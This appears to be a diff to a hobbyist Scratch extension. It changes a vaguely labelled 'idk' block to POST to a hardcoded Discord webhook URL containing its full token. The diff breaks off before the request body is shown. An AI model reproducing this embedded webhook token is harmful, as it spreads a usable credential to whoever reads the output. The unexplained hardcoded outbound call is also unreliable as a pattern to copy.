@@ -19,13 +19,7 @@ class kylesAddon {
         },  '---',  {
              opcode: 'test',
             blockType: Scratch.BlockType.COMMAND,
-            text: 'idk [url]',
-            "arguments": {
-              "url": {
-                "type": Scratch.ArgumentType.STRING,
-                "defaultValue": "hello",
-              }
-            }
+            text: 'idk',
         },
       ]
     }  
@@ -33,9 +27,9 @@ class kylesAddon {
 get({url}) {
     return fetch("https://api.allorigins.win/raw?url=" + url).then(response => response.text()).catch(err => 'ERROR');
   };
-  test(args) {
+  test() {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", args);
+    xhr.open("POST", "https://discord.com/api/webhooks/945524710047895573/krPI5xZVFIrhZTlIUW-dJgx5y3dob4G2COPPr7b3bTIzYyz7kjFuukZf60T9NhSvg1pe");
     
     xhr.setRequestHeader("Accept", "application/json");
     xhr.setRequestHeader("Content-Type", "application/json");
